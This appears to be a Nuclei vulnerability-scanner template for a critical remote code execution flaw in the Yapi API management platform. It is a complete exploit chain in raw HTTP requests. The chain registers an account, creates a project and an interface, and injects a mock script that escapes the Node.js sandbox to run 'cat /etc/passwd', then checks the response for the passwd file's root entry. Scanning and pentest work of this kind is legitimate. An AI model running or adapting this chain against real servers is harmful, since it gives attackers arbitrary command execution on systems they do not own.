id: yapi-rce
info:
  author: pikpikcu
  name: Yapi Remote Code Execution
  reference: '- https://www.secpulse.com/archives/162502.html

    - https://gist.github.com/pikpikcu/0145fb71203c8a3ad5c67b8aab47165b

    - https://twitter.com/sec715/status/1415484190561161216

    - https://github.com/YMFE/yapi

    '
  severity: critical
  tags: yapi,rce
requests:
- cookie-reuse: true
  extractors:
  - group: 1
    internal: true
    name: group_id
    part: body
    regex:
    - '"_id":([0-9]+),"group_name"'
    type: regex
  - group: 1
    internal: true
    name: interface_id
    part: body
    regex:
    - '"req_body_form":\[\],"_id":([0-9]+)'
    type: regex
  - group: 1
    internal: true
    name: project_id
    part: body
    regex:
    - '"tag":\[\],"_id":([0-9]+)'
    type: regex
  matchers:
  - part: body
    regex:
    - 'root:[x*]:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /api/user/reg HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Content-Length: 94

    Content-Type: application/json;charset=UTF-8

    Accept-Encoding: gzip


    {"email":"{{randstr}}@example.com","password":"{{randstr}}","username":"{{randstr}}"}

    '
  - 'GET /api/group/list HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Content-Type: application/json, text/plain, */*

    Accept-Encoding: gzip

    '
  - 'POST /api/project/add HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Content-Length: 106

    Content-Type: application/json;charset=UTF-8

    Accept-Encoding: gzip


    {"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}

    '
  - 'GET /api/project/get?id={{project_id}} HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Accept-Encoding: gzip

    '
  - 'POST /api/interface/add HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Content-Length: 89

    Content-Type: application/json;charset=UTF-8

    Accept-Encoding: gzip


    {"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}

    '
  - 'POST /api/plugin/advmock/save HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Content-Length: 382

    Content-Type: application/json;charset=UTF-8

    Accept-Encoding: gzip


    {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const
    sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor
    = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor(''return
    process'')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat
    /etc/passwd\").toString()","enable":true}

    '
  - 'GET /mock/{{project_id}}/{{randstr_1}} HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Accept-Encoding: gzip

    '
